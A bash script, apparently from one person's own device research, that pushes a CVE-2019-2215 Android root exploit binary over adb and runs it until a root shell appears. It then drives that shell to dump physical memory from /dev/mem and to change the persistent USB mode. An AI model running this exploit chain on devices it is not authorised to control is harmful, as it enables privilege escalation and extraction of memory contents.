#!/bin/bash
# Root via the frozen exploit (the 2026-10-02 winning recipe) and dump the
# reserved-RAM windows, then make mtp,adb the persistent USB mode.
#
# The recipe (from ane_set_usb_default.sh, which won on 2026-10-02):
#   * verify the frozen winning build by md5
#   * one run per boot, never kill a progressing run (the SELinux stage is slow)
#   * drive the root shell through a fifo with marker-framed commands
# Differences here: no reboot (a fresh adb after reboot may not come back while
# persist.sys.usb.config still leads with HiSuite; this boot is a clean RESTORE
# boot), and the payload commands are the RAM dump.
set -u
cd "$(dirname "$0")"
LOG=usb_runs/root_dump2.log
say() { echo "$(date '+%H:%M:%S') $*" | tee -a "$LOG"; }

EXP=/data/local/tmp/cve-2019-2215
FROZEN="$HOME/dev/p20-root/working/cve-2019-2215_0x134c838"
WANT_MD5=$(md5sum "$FROZEN" | cut -d' ' -f1)

if ! timeout 15 adb devices 2>/dev/null | awk 'NR==2{print $2}' | grep -q device; then
  say "device is not on adb"; exit 1
fi

say "boot state: $(timeout 10 adb shell getprop sys.boot_completed 2>/dev/null | tr -d '\r') uptime=$(timeout 10 adb shell cat /proc/uptime 2>/dev/null | awk '{print int($1)}')s"

say "ensuring the frozen exploit is on the device (md5 $WANT_MD5)"
GOT_MD5=$(timeout 30 adb shell "md5sum $EXP 2>/dev/null" | awk '{print $1}')
if [ "$GOT_MD5" != "$WANT_MD5" ]; then
  say "device has '${GOT_MD5:-nothing}'; pushing the frozen build"
  timeout 60 adb push "$FROZEN" "$EXP" 2>&1 | tail -1
  timeout 10 adb shell "chmod 755 $EXP"
  GOT_MD5=$(timeout 30 adb shell "md5sum $EXP" | awk '{print $1}')
fi
if [ "$GOT_MD5" != "$WANT_MD5" ]; then
  say "FATAL: wrong binary on the device ($GOT_MD5)"; exit 1
fi
say "md5 ok"

say "settle 60s (this boot is already ~5 min old and lightly used)"
sleep 60

say "starting the root shell (fifo kept open)"
IN=/tmp/anedmp_in; OUT=/tmp/anedmp_out
rm -f "$IN" "$OUT"; mkfifo "$IN"; : > "$OUT"
adb shell "$EXP" < "$IN" >> "$OUT" 2>&1 &
EXP_PID=$!
exec 9> "$IN"
ROOT=0
for i in $(seq 1 900); do
  grep -q "uid=0(root)" "$OUT" 2>/dev/null && { say "ROOT after ${i}s"; ROOT=1; break; }
  sleep 1
done
if [ "$ROOT" != 1 ]; then
  say ">>> exploit did not reach root this boot. tail:"
  tail -8 "$OUT" | sed 's/^/    /'
  exec 9>&-
  kill "$EXP_PID" 2>/dev/null
  exit 1
fi

runroot() {
  local mark="MK$RANDOM$RANDOM" before
  before=$(wc -c < "$OUT")
  printf 'echo %s\n%s\necho %s\n' "$mark" "$1" "$mark" >&9
  for i in $(seq 1 120); do
    sleep 1
    [ "$(tail -c +$((before+1)) "$OUT" | grep -c "^$mark$")" -ge 2 ] && break
  done
  tail -c +$((before+1)) "$OUT" | awk -v m="$mark" 'BEGIN{n=0} {if ($0==m){n++; next} if (n==1) print}'
}

say "== root id:"
runroot 'id'
say "== dumping reserved RAM 0x34000000..0x34900000 (9 MiB)"
runroot 'dd if=/dev/mem of=/data/local/tmp/ram_34.bin bs=4096 skip=212992 count=2304 2>/tmp/dd.err; echo dd_rc=$?; cat /tmp/dd.err; ls -la /data/local/tmp/ram_34.bin'
say "== pulling the dump"
timeout 300 adb pull /data/local/tmp/ram_34.bin usb_runs/ram_34.bin 2>&1 | tail -1
ls -la usb_runs/ram_34.bin 2>/dev/null || say "no dump landed"

say "== making mtp,adb the persistent USB mode (the ane_set_usb_default payload)"
runroot 'setprop persist.sys.usb.config mtp,adb; echo setprop_rc=$?'
runroot 'echo -n mtp,adb > /data/property/persist.sys.usb.config; echo file_rc=$?'
say "== verify (through the root shell)"
runroot 'getprop persist.sys.usb.config; cat /data/property/persist.sys.usb.config; echo'

exec 9>&-
kill "$EXP_PID" 2>/dev/null
say "done"
